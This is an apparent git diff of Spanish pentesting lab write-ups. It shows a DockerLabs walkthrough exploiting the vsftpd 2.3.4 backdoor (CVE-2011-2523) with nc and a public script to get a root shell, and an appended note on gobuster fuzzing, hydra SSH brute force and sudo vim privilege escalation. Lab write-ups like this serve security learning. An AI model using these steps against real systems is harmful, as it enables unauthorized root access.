@@ -8,34 +8,84 @@ Realizamos un escaneo inicial de puertos en la máquina objetivo para identifica
 
 ![[Pasted image 20260618225121.png]]
 
+```bash
+nmap -sCV -p21,80 -oN targeted 172.17.0.2
+```
+
 **Servicios identificados:**
 
-* **Puerto 21/TCP (FTP):** Servicio de transferencia de archivos activo. Ver teoría en [FTP.md](<../../../Pentesting Notes/1_Enumeration/FTP.md>).
-* **Puerto 80/TCP (HTTP):** Servidor web activo. Ver teoría en [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>).
+* **Puerto 21/TCP (FTP):** Servicio de transferencia de archivos corriendo `vsftpd 2.3.4`. Ver teoría en [FTP.md](<../../../Pentesting Notes/1_Enumeration/FTP.md>).
+* **Puerto 80/TCP (HTTP):** Servidor web `Apache httpd 2.4.58 (Ubuntu)`. Ver teoría en [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>).
 
 ***
 
 ### Enumeración de Servicios y Vulnerabilidades
 
-#### Análisis del Servicio FTP
+#### Análisis del Servicio FTP (vsftpd 2.3.4)
 
-Inspeccionamos la versión del servicio FTP que está corriendo en el servidor. Al ser una versión antigua, procedemos a verificar si cuenta con vulnerabilidades públicas explotables:
+Inspeccionamos la versión del servicio FTP detectada (`vsftpd 2.3.4`). Esta versión específica es ampliamente conocida por contener una puerta trasera (*backdoor*) introducida en su código fuente oficial (identificada como **CVE-2011-2523**):
 
 ![[Pasted image 20260618225158.png]]
 
-* **Resultado:** \[Explicar aquí el exploit o vulnerabilidad identificada para la versión de FTP y cómo se procedió a explotarlo].
+* **Mecanismo de la vulnerabilidad (CVE-2011-2523):** Si se envía un nombre de usuario que contiene la secuencia `:)` (por ejemplo `USER anonymous:)`), el demonio activa una señal interna que abre un socket en el puerto TCP `6200` ofreciendo una consola interactiva con privilegios de superusuario (`root`).
 
 ***
 
 ### Fase de Explotación / Intrusión
 
-* \[Documentar el método de ejecución del exploit, las opciones configuradas y cómo se obtuvo el acceso inicial a la máquina].
+Podemos explotar la puerta trasera de dos maneras: de forma manual con `nc` o mediante un script de explotación en Python.
+
+#### Opción 1: Explotación Manual (Netcat)
+
+1. Nos conectamos al servicio FTP en el puerto 21 y enviamos el disparador (*trigger*) en el campo de usuario:
+
+```bash
+nc 172.17.0.2 21
+```
+
+```text
+220 (vsFTPd 2.3.4)
+USER hacker:)
+331 Please specify the password.
+PASS password
+```
+
+2. Una vez enviado el trigger, el servidor abre el puerto 6200 con una shell de root. Nos conectamos directamente con `nc`:
+
+```bash
+nc 172.17.0.2 6200
+```
+
+#### Opción 2: Script en Python
+
+También podemos utilizar el script público en Python para automatizar el proceso:
+
+```bash
+git clone https://github.com/padsalatushal/CVE-2011-2523.git
+cd CVE-2011-2523
+python3 exploit.py 172.17.0.2
+```
 
 ***
 
 ### Escalada de Privilegios
 
-* \[Documentar los comandos de enumeración ejecutados en el sistema víctima y los pasos realizados para obtener privilegios de root].
+Al explotar la puerta trasera de `vsftpd 2.3.4`, el proceso se ejecuta directamente bajo el contexto del usuario `root` (`uid=0(root) gid=0(root)`), por lo que **obtenemos acceso con máximos privilegios de manera directa** sin requerir una fase de elevación adicional.
+
+Para estabilizar y obtener una terminal TTY interactiva completa, ejecutamos:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Comprobamos la identidad en el sistema:
+
+```bash
+id
+# uid=0(root) gid=0(root) groups=0(root)
+whoami
+# root
+```
 
 ***
 
@@ -43,10 +93,3 @@ Inspeccionamos la versión del servicio FTP que está corriendo en el servidor. 
 
 * **Teoría:** [FTP.md](<../../../Pentesting Notes/1_Enumeration/FTP.md>), [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>)
 * **Laboratorios Relacionados:** [ApiBase](../Facil/ApiBase.md) (Comparte análisis relacionado con servicios FTP)
-
-
-
-**notas que se borraron:**
-
-Hacemos el escaneo incial:![[Pasted image 20260618225121.png]]Vemos que solo hay el puerto 80 abierto HTTP y el 21 FTP.Vemos la version de FTP que es una antigua y comprobamos y tiene un exploit:![[Pasted image 20260618225158.png]]
-Collapse file‎Laboratorios/DockerLabs/MuyFacil/Trust.md‎Copy file name to clipboard+54Lines changed: 54 additions & 0 deletionsDisplay the source diffDisplay the rich diffOriginal file line numberDiff line numberDiff line change@@ -0,0 +1,54 @@Empzamos el escaneo nmap:![[Pasted image 20260624125557.png]]Vemos que hay el puerto 22 SSH abierto y el puerto 80 HTTP abierto.SI intentamos acceder a la web, vemos que esta la pagina por defecto de apache, pero si hacemos fuzzing de directorios y extensiones con el comando:```bashgobuster dir -u 'http://172.17.0.2' -w /usr/share/wordlist/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php,html,txt -t 50 --exclude-length 10701```![[Pasted image 20260624125713.png]]Encontramos un archivo php llamado *secret.php*. Intentamos acceder a él:![[Pasted image 20260624125858.png]]Nos sale solo ese texto, asique intentamos mirar las peticiones que hace GET pero no encontramos nada. Si hacemos fuerza bruta al servidor SSH con ese nombre *"mario"* con el comando **hydra**:``` bashhydra -l mario -P /usr/share/wordlist/Rockyou.txt -t 50 -I ssh://172.17.0.2```![[Pasted image 20260624130031.png]]Encontramos credenciales válidas, asi que accedemos al server SSH:![[Pasted image 20260624130050.png]]Pero no somos root, asi que vemos si podemos escalar privilegios:SI ejecutamos *sudo -l* para ver que comandos podemos ejecutar como sudo y que permisos.![[Pasted image 20260624130232.png]]Vemos que vim se puede ejecutar como usuario root siendo mario.Asi que si entramos a vim, y escribimos bash, nos dará una shell como root:``` bashsudo vim:!bash```![[Pasted image 20260624130345.png]]
